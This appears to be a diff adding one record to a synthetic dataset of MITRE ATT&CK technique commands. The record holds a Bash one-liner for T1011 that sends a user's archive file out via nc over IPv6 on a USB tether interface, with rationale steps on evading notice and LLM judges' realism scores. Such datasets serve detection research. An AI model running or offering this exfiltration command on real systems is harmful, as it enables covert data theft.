@@ -1,0 +1,58 @@
+{
+  "technique_id": "T1011",
+  "platform": "Linux",
+  "shell": "Bash",
+  "command": "nohup tcpdump -i usb0 -nn 'ip6 and tcp port 54531' -U -w /dev/null >/dev/null 2>&1 & nc -6 -s fe80::a00:27ff:fe12:3456%usb0 fe80::2%usb0 54531 < /home/user/.local/share/archive.tgz",
+  "explanation": "Uses IPv6 over a USB tether interface (usb0) to exfiltrate via a non-standard TCP port, monitored narrowly by tcpdump. This is a separate medium and protocol path consistent with T1011.",
+  "rationale_steps": [
+    "Constrain traffic to IPv6 on usb0 to avoid the primary IPv4 LAN.",
+    "Use high TCP port 54531 to minimize notice.",
+    "Run tcpdump with an IPv6 filter and discard capture.",
+    "nc -6 with a scoped link-local source ties the flow to usb0."
+  ],
+  "obfuscation_level": "none",
+  "id": "SYN-BASH-T1011-a2471e69-182a2b43",
+  "source_prompt_hash": "a2471e69",
+  "timestamp_utc": "2025-09-30T08:19:52.942834Z",
+  "validation": {
+    "syntax_ok": null,
+    "llm_judgments": [
+      {
+        "model": "gpt-5",
+        "syntactic_score": 5,
+        "syntactic_justification": "Commands are properly quoted and separated; flags are valid; backgrounding and redirections are correct for both tcpdump and nc.",
+        "semantic_score": 4,
+        "semantic_justification": "Uses IPv6 over a USB (usb0) interface with a nonstandard TCP port to send a file via netcat, matching exfiltration over an alternate medium (T1011), but relies on environment (link-local addresses, listener) and tcpdump typically requires elevated privileges.",
+        "combined_score": 4.5,
+        "confidence": 0.8,
+        "timestamp": "2025-10-01T01:05:34.220364Z"
+      },
+      {
+        "model": "claude-sonnet-4-6",
+        "syntactic_score": 4,
+        "syntactic_justification": "The command is well-formed with proper use of nohup, backgrounding, redirection, and nc flags, though the tcpdump writing to /dev/null while also redirecting stdout to /dev/null is redundant but syntactically valid, and the IPv6 link-local address with interface scope notation is correct for Linux.",
+        "semantic_score": 4,
+        "semantic_justification": "The command credibly demonstrates T1011 by using a USB tether interface (usb0) as an alternative network medium for exfiltration via IPv6 and nc, which is operationally plausible, though the tcpdump component monitoring its own exfiltration traffic and writing to /dev/null serves no clear operational purpose and slightly reduces realism.",
+        "combined_score": 4.0,
+        "confidence": 0.82,
+        "timestamp": "2026-02-18T22:05:20.374037Z"
+      },
+      {
+        "model": "gemini-3-flash-preview",
+        "syntactic_score": 5,
+        "syntactic_justification": "The command is a perfectly valid Bash one-liner using standard tools, correct shell redirection, and proper backgrounding syntax.",
+        "semantic_score": 4,
+        "semantic_justification": "The command correctly uses an alternative network interface (usb0) for exfiltration via IPv6 link-local addresses, though the included tcpdump component would likely fail without root privileges, which contradicts the specified 'None' privilege level.",
+        "combined_score": 4.5,
+        "confidence": 1,
+        "timestamp": "2026-02-18T22:05:25.791185Z"
+      }
+    ],
+    "llm_average_syntactic": 4.667,
+    "llm_average_semantic": 4.0,
+    "llm_average_score": 4.333,
+    "llm_verdict": "likely_match",
+    "sandbox_trace_id": null,
+    "mitre_match_score": null
+  }
+}
